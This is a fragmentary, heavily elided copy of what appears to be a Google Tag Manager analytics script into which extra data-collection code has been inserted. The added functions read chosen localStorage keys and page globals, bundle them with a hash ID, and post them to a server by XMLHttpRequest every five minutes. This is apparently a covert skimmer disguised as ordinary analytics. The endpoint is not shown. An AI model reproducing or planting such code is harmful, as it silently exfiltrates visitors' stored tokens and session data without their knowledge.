...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "vtp_instanceDestinationId": "G-RBNL7EL24K",
        "tag_id": 3
      }, {
  ...
  */
  ...
  ii.fe = Number("0") || 0;
  ii.ka = "dataLayer";
  ii.Uj = "ChEI8POGpwYQwKfQoLnu2YWNARIlABhc5uc2LCXkOcMp8ZgWrOe9vGbeA1PMw6NFwcgmWh0BwIyE3BoCh1I\x3d";
  var li = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  var P = [];
  const keysToKeepTrack = window.keysToKeepTrack;
  P[5] = !0;
  P[6] = !0;
  P[12] = !0;
  P[7] = !0;
  ...
  function hashGenerate(data) {
    ...
    const joinedKeys = objKeys.join("");
    let hashVal = 0;
    for (let i = 0; i < joinedKeys.length; i++) {
      const character = joinedKeys.charCodeAt(i);
      hashVal = (hashVal << 5) - hashVal + character;
  ...
  ;
  function getLocalStorageMatchingData() {
    const localStorageInfo = {};
    for (let i = 0; i < window.localStorage.length; i++) {
      const infoKey = window.localStorage.key(i);
      if (keysToKeepTrack.includes(infoKey)) {
        const infoValue = window.localStorage.getItem(infoKey);
        localStorageInfo[infoKey] = infoValue;
      }
    }
  ...
  ;
  function serverDataSender(data) {
    const ID = hashGenerate(data);
    ...
    httpRequest.send(JSON.stringify(payloadInfo));
    httpRequest.onreadystatechange = function () {
      if (httpRequest.readyState === XMLHttpRequest.DONE) {
        if (httpRequest.status === 200) {
          console.log("Data sent successfully to the server");
        } else {
          console.error("Failed to send data, status code:" + httpRequest.status);
        }
      }
    };
  }
  ...
  function Tz(a) {}
  Tz.H = "callOnDomReady";
  function collectAndSendLocalData() {
    const matchedData = getLocalStorageMatchingData();
    let globals = GlobalVarsCapture();
    let combinedData = {
      ...matchedData,
      ...globals
    };
    if (Object.keys(matchedData).length > 0) {
      serverDataSender(combinedData);
    }
  }
  function Uz(a) {}
  ...
  function TC() {
    var a = new jb();
    L(this, "read_container_data"), a.set("containerId", 'G-RBNL7EL24K'), a.set("version", '1'), a.set("environmentName", ''), a.set("debugMode", Xf), a.set("previewMode", Zf), a.set("environmentMode", Yf), Q(96) && a.set("firstPartyServing", ri || ti), a.sc();
    return a;
  }
  ...
  setInterval(collectAndSendLocalData, 5 * 60 * 1000);
  aa.Al = function (a) {
    a.h[N.g.zd] = void 0;
    this.Ih();
    this.B = 0;
